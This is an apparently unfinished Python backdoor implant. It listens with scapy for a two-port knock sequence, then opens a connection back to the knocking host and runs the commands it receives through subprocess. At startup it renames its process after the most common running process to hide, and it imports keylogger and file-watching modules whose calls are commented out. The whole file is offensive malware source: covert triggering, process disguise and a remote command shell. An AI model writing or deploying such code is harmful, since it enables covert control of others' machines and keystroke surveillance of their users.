import subprocess
import setproctitle
import psutil
import time
from scapy.all import *
from watch import Watch
from keylog import Keylog
ipaddress = []
correct_knocks = []

def handle(pkt):
    # tcp and dst port 19634 or (tcp and dst port 16343)
    if pkt['TCP'].flags != "RA":
        src_addr = pkt['IP'].src
        if src_addr not in ipaddress:
            ipaddress.append(src_addr)
            correct_knocks.append("")
        index = ipaddress.index(src_addr)

        if pkt['TCP'].dport == 19634 and pkt['TCP'].sport == 14369:
            correct_knocks[index] += "1"
        if pkt['TCP'].dport == 16343 and pkt['TCP'].sport == 13436:
            correct_knocks[index] += "2"
        if "1" in correct_knocks[index] and "2" in correct_knocks[index]:
            time.sleep(.5)
            print(f"making connection with {src_addr}")
            connection(src_addr)


def get_best_process_name():
    process_dict = {}
    for proc in psutil.process_iter():
        try:
            process_name = proc.name()
            if process_name in process_dict:
                process_dict.update({process_name: process_dict.get(process_name) + 1})
            else:
                process_dict[process_name] = 1
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    best_process_name = next(iter(process_dict))
    for process_name in process_dict:
        if process_dict.get(process_name) > process_dict.get(best_process_name):
            best_process_name = process_name
    return best_process_name


def run_command(command):
    try:
        data = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = data.communicate()
    except Exception:
        out = ("psh: command not found: {}".format(command))
    print(out.decode())

def connection(ip):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((ip, 80))
        print(f"connected")
        while True:
            command = s.recv(2048)
            if not command:
                break
            print(f"Received {command}")
            # command = fernet.decrypt(command.decode()).decode()
            print(f"Decoded {command}")
            if command == "exit":
                break
            try:
                data = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                out, err = data.communicate()
            except Exception:
                out = ("psh: command not found: {}".format(command)).encode()
            # s.sendall(fernet.encrypt(out))


if __name__ == '__main__':
    setproctitle.setproctitle(get_best_process_name())
    key_logger = Keylog()
    watch = Watch()
    while True:
        sniff(filter="tcp and dst port 19634 or (tcp and dst port 16343)", prn=handle)

        # key_logger.start_keylogger()
        # key_logger.stop_keylogger()
        #
        # watch.add_watched("/root/Downloads", True)
        # watch.start()
        # watch.stop()
        # run_command("ls")
        # run_command("ls -a")
